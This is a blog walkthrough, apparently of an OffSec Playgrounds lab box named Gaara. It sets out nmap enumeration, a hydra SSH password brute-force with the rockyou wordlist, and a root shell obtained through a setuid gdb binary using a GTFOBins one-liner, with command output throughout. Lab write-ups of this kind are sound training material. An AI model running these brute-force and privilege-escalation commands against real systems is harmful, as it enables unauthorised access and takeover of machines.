@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en-us">
+<head><script src="/blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=blog/livereload" data-no-instant defer></script>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="theme-color" content="#1b1b1b">
+	<title>Gaar | Dexter</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		
+  <meta itemprop="name" content="Gaar">
+  <meta itemprop="description" content="Introduction In today’s post, we have another easy box from offsec playgrounds. The goal here was to use a mix of automated tools to be able to brute the password of a user to get initial foothold. Then we could escalate our privileges using a nice GTFO bin.
+Let’s learn.
+Enumaration cat nmap.txt # Nmap 7.94SVN scan initiated Thu Apr 25 18:43:07 2024 as: nmap -sVC -T4 -vv -oN nmap.txt 192.168.219.142 Nmap scan report for 192.168.219.142 Host is up, received echo-reply ttl 61 (0.14s latency). Scanned at 2024-04-25 18:43:08 EAT for 26s Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 61 OpenSSH 7.9p1 Debian 10&#43;deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 3e:a3:6f:64:03:33:1e:76:f8:e4:98:fe:be:e9:8e:58 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDS8evJ7ywX5kz396YcIuR&#43;rucTJ/OAK1SSpQoyx6Avj3v1/ZeRvikDEBZRZE4KMV4/&#43;LraxOvCIb0rkU98B5WME6IReWvGTbF99x6wc2sDCG5haD5/OI6At8xrEQPV6FL8NqipouEeYXU5lp/aR7vsdJAs/748uo6Xu4xwUWKFit3RvCHAdhuNfXj5bpiWESerc6mjRm1dPIwIUjJb2zBKTMFiVxpl8R3BXRLV7ISaKQwEo5zp8OzfxDF0YQ5WxMSaKu6fsBh/XDHr&#43;m2A7TLPfIJPS2i2Y8EPxymUahuhSq63nNSaaWNdSZwpbL0qCBPdn1jtTjh26fGbmPeFVdw1 | 256 6c:0e:b5:00:e7:42:44:48:65:ef:fe:d7:7c:e6:64:d5 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPFPC21nXnF1t6XmiDOwcXTza1K6jFzzUhlI&#43;zb878mxsPin/9KvLlW9up9ECWVVTKbiIieN8cD0rF7wb3EjkHA= | 256 b7:51:f2:f9:85:57:66:a8:65:54:2e:05:f9:40:d2:f4 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBprcu3jXo9TbgN5tBKvrojw4OFUkQIH&#43;dITgacg3BLV 80/tcp open http syn-ack ttl 61 Apache httpd 2.4.38 ((Debian)) | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST |_http-title: Gaara |_http-server-header: Apache/2.4.38 (Debian) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Apr 25 18:43:34 2024 -- 1 IP address (1 host up) scanned in 27.31 seconds Here we go for a simple nmap scan.">
+  <meta itemprop="datePublished" content="2024-06-13T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2024-06-13T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1501">
+  <meta itemprop="keywords" content="Privesc,Boot2root,Hydra">
+	<link rel="stylesheet" href="/blog/css/bundle.css">
+	<link rel="icon" href="/blog/icons/16.png" sizes="16x16" type="image/png">
+	<link rel="icon" href="/blog/icons/32.png" sizes="32x32" type="image/png">
+</head>
+<body class="body kind-page">
+	<header class="header">
+	<a class="logo" href="/blog/">Dexter</a>
+	
+</header>
+	<div class="primary">
+	
+	<main class="main">
+		
+		<div class="single block">
+			<article class="entry">
+				<h1 class="entry__title">Gaar</h1>
+<details class="entry__toc toc" open>
+	<summary class="toc__title">Table of Contents</summary>
+	<nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumaration">Enumaration</a></li>
+    <li><a href="#hail-hydra">Hail hydra</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#root">Root</a></li>
+  </ul>
+</nav>
+</details>
+				<div class="entry__content"><h1 id="introduction">Introduction</h1>
+<p>In today&rsquo;s post, we have another easy box from <a href="https://portal.offsec.com/labs/play">offsec playgrounds</a>. The goal here was to use a mix of automated tools to be able to brute the password of a user to get initial foothold. Then we could escalate our privileges using a nice GTFO bin.</p>
+<p>Let&rsquo;s learn.</p>
+<h2 id="enumaration">Enumaration</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat nmap.txt
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94SVN scan initiated Thu Apr 25 18:43:07 2024 as: nmap -sVC -T4 -vv -oN nmap.txt 192.168.219.142</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.219.142
+</span></span><span style="display:flex;"><span>Host is up, received echo-reply ttl <span style="color:#ae81ff">61</span> <span style="color:#f92672">(</span>0.14s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2024-04-25 18:43:08 EAT <span style="color:#66d9ef">for</span> 26s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON         VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack ttl <span style="color:#ae81ff">61</span> OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 3e:a3:6f:64:03:33:1e:76:f8:e4:98:fe:be:e9:8e:58 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDS8evJ7ywX5kz396YcIuR+rucTJ/OAK1SSpQoyx6Avj3v1/ZeRvikDEBZRZE4KMV4/+LraxOvCIb0rkU98B5WME6IReWvGTbF99x6wc2sDCG5haD5/OI6At8xrEQPV6FL8NqipouEeYXU5lp/aR7vsdJAs/748uo6Xu4xwUWKFit3RvCHAdhuNfXj5bpiWESerc6mjRm1dPIwIUjJb2zBKTMFiVxpl8R3BXRLV7ISaKQwEo5zp8OzfxDF0YQ5WxMSaKu6fsBh/XDHr+m2A7TLPfIJPS2i2Y8EPxymUahuhSq63nNSaaWNdSZwpbL0qCBPdn1jtTjh26fGbmPeFVdw1
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 6c:0e:b5:00:e7:42:44:48:65:ef:fe:d7:7c:e6:64:d5 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPFPC21nXnF1t6XmiDOwcXTza1K6jFzzUhlI+zb878mxsPin/9KvLlW9up9ECWVVTKbiIieN8cD0rF7wb3EjkHA<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> b7:51:f2:f9:85:57:66:a8:65:54:2e:05:f9:40:d2:f4 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBprcu3jXo9TbgN5tBKvrojw4OFUkQIH+dITgacg3BLV
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack ttl <span style="color:#ae81ff">61</span> Apache httpd 2.4.38 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: OPTIONS HEAD GET POST
+</span></span><span style="display:flex;"><span>|_http-title: Gaara
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.38 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Thu Apr 25 18:43:34 2024 -- 1 IP address (1 host up) scanned in 27.31 seconds</span>
+</span></span></code></pre></div><p>Here we go for a simple <code>nmap</code> scan.</p>
+<p><code>nmap -sVC -T4 -vv -oN scan_results.txt &lt;ip&gt;</code></p>
+<p>Let us break that down.</p>
+<ol>
+<li>
+<p><code>nmap</code>: This is the command itself, that works as a network mapper.</p>
+</li>
+<li>
+<p><code>-sVC</code>: We can break this down into two:</p>
+<ul>
+<li>
+<p><code>-sV</code>: This option allows the scanner to detect the version of the services running on open ports. It tries to identify the version of the service software running on each port</p>
+</li>
+<li>
+<p><code>sC</code>: This enables the scanner to run a set of default scripts against the target. These scripts are majorly used for more detailed service enumaration and vulerability detection.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><code>-T4</code>: This option sets the timing to a more aggressive scan. The scanner has 6 timing options ranging from 0 through 5. Example: <code>-T5</code> is a very fast scan, at the cost of accuracy.</p>
+</li>
+<li>
+<p><code>-vv</code>: This option increases the details in our output as the scan proceeds.</p>
+</li>
+<li>
+<p><code>-oN</code>: This option specifies the output format and file, guiding the scanner to save the output in a file specified by the user <code>-oN scan_results.txt</code>.</p>
+</li>
+</ol>
+<p>You can read more on the official <a href="https://nmap.org/book/man.html">manual page</a>.</p>
+<p>As from the output we see that we have two open ports, port 22 and port 80. Port 22 which is used as the default port for secure shell protocol. We also have port 80, used as the default network port for unencrypted web pages using HTTP protocol. With it&rsquo;s secure protocol (HTTPS), default on port 443.</p>
+<p>We can begin by visiting the address, and we are met with just a wallpaper. Well I might wanna save you the trouble and just skip the port 80 since it had really nothing and it was just a rabbit hole.</p>
+<h2 id="hail-hydra">Hail hydra</h2>
+<p>So remember the wallpaper we just saw on the address? Well doing a quick a google search we actually find out that is Gaara, which also happens to be the name of the machine. This could be a leverage point as we can assume that Gaara is a username and we can actually try and bruteforce his password using an automation tool called <a href="https://github.com/vanhauser-thc/thc-hydra">hydra</a>.</p>
+<p><img src="https://gist.github.com/assets/116626767/85523ac5-ad13-4f73-90c1-d9ddb4e26fee" alt="captain-america-avengers"></p>
+<p>We will also make use of a very common wordlist file called rockyou that contains millions of common passwords originating from a data breach. These passwords are stored in plaintext and are easily accessible.</p>
+<p><code>hydra -l &lt;username&gt; -P &lt;path to wordlist&gt; ssh:&lt;ip&gt;</code>.</p>
+<p>We can break that down real quick:</p>
+<ol>
+<li>
+<p><code>hydra</code>: This is the command itself. Hydra is a powerful tool used for password cracking and performing brute force attacks on various services.</p>
+</li>
+<li>
+<p><code>-l &lt;username&gt;</code>: This option specifies the username you want to try to log in as. Replace <!-- raw HTML omitted --> with the actual username.</p>
+</li>
+<li>
+<p><code>-P &lt;path to wordlist&gt;</code>: This option tells Hydra to use a wordlist file containing possible passwords. Replace <!-- raw HTML omitted --> with the actual path to the wordlist file you want to use. For example, if the wordlist is rockyou.txt and it&rsquo;s located in the current directory, you would use -P ./rockyou.txt.</p>
+</li>
+<li>
+<p><code>ssh://&lt;ip&gt;</code>: This part specifies the service (SSH) and the target IP address you want to attack. Replace <!-- raw HTML omitted --> with the actual IP address of the target machine. As earlier stated, SSH is a protocol used to securely connect to remote servers.</p>
+</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>hydra -l gaara -P /usr/share/wordlists/rockyou.txt ssh://192.168.219.142
+</span></span><span style="display:flex;"><span>Hydra v9.5 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2023</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2024-04-25 19:16:26
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">14344399</span> login tries <span style="color:#f92672">(</span>l:1/p:14344399<span style="color:#f92672">)</span>, ~896525 tries per task
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking ssh://192.168.219.142:22/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 109.00 tries/min, <span style="color:#ae81ff">109</span> tries in 00:01h, <span style="color:#ae81ff">14344293</span> to <span style="color:#66d9ef">do</span> in 2193:20h, <span style="color:#ae81ff">13</span> active
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 192.168.219.142   login: gaara   password: *********
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Writing restore file because <span style="color:#ae81ff">3</span> final worker threads did not complete <span style="color:#66d9ef">until</span> end.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> <span style="color:#ae81ff">3</span> targets did not resolve or could not be connected
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> <span style="color:#ae81ff">0</span> target did not complete
+</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2024-04-25 19:18:58
+</span></span></code></pre></div><p>Great we get a hit on the password. We have enough to securely login into the machine using the credentials found.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ssh gaara@192.168.219.142 
+</span></span><span style="display:flex;"><span>gaara@192.168.219.142<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Linux Gaara 4.19.0-13-amd64 <span style="color:#75715e">#1 SMP Debian 4.19.160-2 (2020-11-28) x86_64</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>Last login: Thu Apr <span style="color:#ae81ff">25</span> 11:55:14 <span style="color:#ae81ff">2024</span> from 192.168.45.238
+</span></span><span style="display:flex;"><span>gaara@Gaara:~$ 
+</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Well now all that is left is to excalate to higher privileges and own the machine. To do this we can go through some linux privilege escalation techniques. There are several scripts online that might help us to enumarate, but it is still very important to understand what pieces of information to look for and be able to perfom this enumaration manually.</p>
+<p>Several details to look out for include the OS version, kernel version and running services. One effective way to find such vectors is by searching for files with the setuid bit set. Setuid files are executed with the permissions of the file owner, which can often be root. If these files have vulnerabilities, they can be exploited to gain elevated privileges.</p>
+<p>We use the following command to find all files with the setuid bit set, which can help us identify these potential privilege escalation opportunities:</p>
+<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+<ol>
+<li><code>find /</code>: The find command starts searching from the root directory (/) and traverses the entire file system.</li>
+<li><code>-perm -u=s</code>: This option specifies that the find command should look for files with the setuid bit set. The setuid bit (u=s) allows a file to be executed with the permissions of the file owner rather than the user running the file.</li>
+<li><code>-type f</code>: This restricts the search to regular files. We&rsquo;re not interested in directories or other types of files for this purpose.</li>
+<li><code>2&gt;/dev/null</code>: This redirects any error messages (such as permission denied errors) to <code>/dev/null</code>, effectively silencing them. This helps keep the output clean and focused only on the results we are interested in.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gaara@Gaara:~$ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device
+</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>/usr/bin/gdb
+</span></span><span style="display:flex;"><span>/usr/bin/sudo
+</span></span><span style="display:flex;"><span>/usr/bin/gimp-2.10
+</span></span><span style="display:flex;"><span>/usr/bin/fusermount
+</span></span><span style="display:flex;"><span>/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/usr/bin/chfn
+</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/usr/bin/su
+</span></span><span style="display:flex;"><span>/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/usr/bin/mount
+</span></span><span style="display:flex;"><span>/usr/bin/umount
+</span></span></code></pre></div><p>From here we now see files that have the setuid bit set. And now we can go over to a pretty neat page called <a href="https://gtfobins.github.io/">GTFO</a>. It contains a list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. Where this binaries can be used to perform various actions such as file read/write operations, privilege escalation and more.</p>
+<p>So what is the Setuid? The (set user ID upon execution) bit is a special permission in Unix-like operating systems that allows the users to run an executable with the permissions of the executable&rsquo;s owner. They are particularly useful for programs that need to perform tasks requiring higher privileges than those of the user running the program. Hence can be exploited to do some privilege escalation.</p>
+<p><img src="https://gist.github.com/assets/116626767/feae4e1c-53d1-43aa-94a9-cc0c75093eb3" alt="image">
+<img src="https://gist.github.com/assets/116626767/feae4e1c-53d1-43aa-94a9-cc0c75093eb3" alt="image"></p>
+<h2 id="root">Root</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gaara@Gaara:~$ /usr/bin/gdb -nx -ex <span style="color:#e6db74">&#39;python import os; os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-p&#34;)&#39;</span> -ex quit
+</span></span><span style="display:flex;"><span>GNU gdb <span style="color:#f92672">(</span>Debian 8.2.1-2+b3<span style="color:#f92672">)</span> 8.2.1
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2018</span> Free Software Foundation, Inc.
+</span></span><span style="display:flex;"><span>License GPLv3+: GNU GPL version <span style="color:#ae81ff">3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;
+</span></span><span style="display:flex;"><span>This is free software: you are free to change and redistribute it.
+</span></span><span style="display:flex;"><span>There is NO WARRANTY, to the extent permitted by law.
+</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;show copying&#34;</span> and <span style="color:#e6db74">&#34;show warranty&#34;</span> <span style="color:#66d9ef">for</span> details.
+</span></span><span style="display:flex;"><span>This GDB was configured as <span style="color:#e6db74">&#34;x86_64-linux-gnu&#34;</span>.
+</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;show configuration&#34;</span> <span style="color:#66d9ef">for</span> configuration details.
+</span></span><span style="display:flex;"><span>For bug reporting instructions, please see:
+</span></span><span style="display:flex;"><span>&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
+</span></span><span style="display:flex;"><span>Find the GDB manual and other documentation resources online at:
+</span></span><span style="display:flex;"><span>    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>For help, type <span style="color:#e6db74">&#34;help&#34;</span>.
+</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;apropos word&#34;</span> to search <span style="color:#66d9ef">for</span> commands related to <span style="color:#e6db74">&#34;word&#34;</span>.
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># whoami</span>
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div></div>
+				
+				<footer class="entry__footer">
+					
+<div class="entry__tags">
+			<a class="entry__tag btn" href="/blog/tags/privesc/">Privesc</a>
+			<a class="entry__tag btn" href="/blog/tags/boot2root/">Boot2root</a>
+			<a class="entry__tag btn" href="/blog/tags/hydra/">Hydra</a>
+</div>
+					
+<div class="entry__share share">
+	<a class="share__link btn" title="Share on Twitter" href="https://twitter.com/intent/tweet/?url=http%3a%2f%2flocalhost%3a1313%2fblog%2fposts%2foffsec%2fgaar%2f&amp;text=Gaar" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on Twitter', 'width=800,height=450,resizable=yes,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="Twitter" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M437 152a72 72 0 0 1-40 12 72 72 0 0 0 32-40 72 72 0 0 1-45 17 72 72 0 0 0-122 65 200 200 0 0 1-145-74 72 72 0 0 0 22 94 72 72 0 0 1-32-7 72 72 0 0 0 56 69 72 72 0 0 1-32 1 72 72 0 0 0 67 50 200 200 0 0 1-105 29 200 200 0 0 0 309-179 200 200 0 0 0 35-37"/></svg>
+	</a>
+	<a class="share__link btn" title="Share on LinkedIn" href="https://www.linkedin.com/shareArticle?mini=true&url=http%3a%2f%2flocalhost%3a1313%2fblog%2fposts%2foffsec%2fgaar%2f&title=Gaar" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on LinkedIn', 'width=640,height=480,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="LinkedIn" role="img" width="32" height="32" viewBox="0 0 512 512"><circle cx="142" cy="138" r="37"/><path stroke-width="66" d="M244 194v198M142 194v198"/><path d="M276 282c0-20 13-40 36-40 24 0 33 18 33 45v105h66V279c0-61-32-89-76-89-34 0-51 19-59 32"/></svg>
+	</a>
+</div>
+				</footer>
+				
+			</article>
+		</div>
+	</main>
+	
+<div class="authorbox block">
+	<div class="author">
+		<div class="author__body">
+			<div class="author__name">
+				Dexter
+			</div>
+			<div class="author__bio">Just human</div>
+		</div>
+	</div>
+</div>
+	
+
+
+
+<div class="related block">
+	<h3 class="related__title">Related</h3>
+	<ul class="related__list">
+		
+		<li class="related__item"><a class="related__link" href="/blog/posts/offsec/amaterasu/">Amaterasu</a></li>
+		
+		<li class="related__item"><a class="related__link" href="/blog/posts/htb/surveillance/">Surveillance</a></li>
+		
+		<li class="related__item"><a class="related__link" href="/blog/posts/thm/alice/">Alice in Wonderland</a></li>
+		
+		<li class="related__item"><a class="related__link" href="/blog/posts/thm/archangel/">Archangel</a></li>
+		
+		<li class="related__item"><a class="related__link" href="/blog/posts/thm/bountyhacker/">Bounty Hacker</a></li>
+		
+	</ul>
+</div>
+
+	
+
+	</div>
+	<footer class="footer">
+<div class="footer__social social">
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="mailto:dexter7isme@gmail.com">
+			<svg class="social__icon" aria-label="Email" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M299 268l124 106c-4 4-10 7-17 7H106c-7 0-13-3-17-7l124-106 43 38 43-38zm-43 13L89 138c4-4 10-7 17-7h300c7 0 13 3 17 7L256 281zm54-23l121-105v208L310 258zM81 153l121 105L81 361V153z"/></svg>
+		</a>
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="https://github.com/w-47">
+			<svg class="social__icon" aria-label="Github" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M335 499c14 0 12 17 12 17H165s-2-17 12-17c13 0 16-6 16-12l-1-50c-71 16-86-28-86-28-12-30-28-37-28-37-24-16 1-16 1-16 26 2 40 26 40 26 22 39 59 28 74 22 2-17 9-28 16-35-57-6-116-28-116-126 0-28 10-51 26-69-3-6-11-32 3-67 0 0 21-7 70 26 42-12 86-12 128 0 49-33 70-26 70-26 14 35 6 61 3 67 16 18 26 41 26 69 0 98-60 120-117 126 10 8 18 24 18 48l-1 70c0 6 3 12 16 12z"/></svg>
+		</a>
+</div>
+	<div class="footer__copyright">© 2025 Dexter. <span class="footer__copyright-credits">Powered by <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/vimux/binario" rel="nofollow noopener" target="_blank">Binario</a> theme.</span></div>
+</footer>
+</body>
+</html>
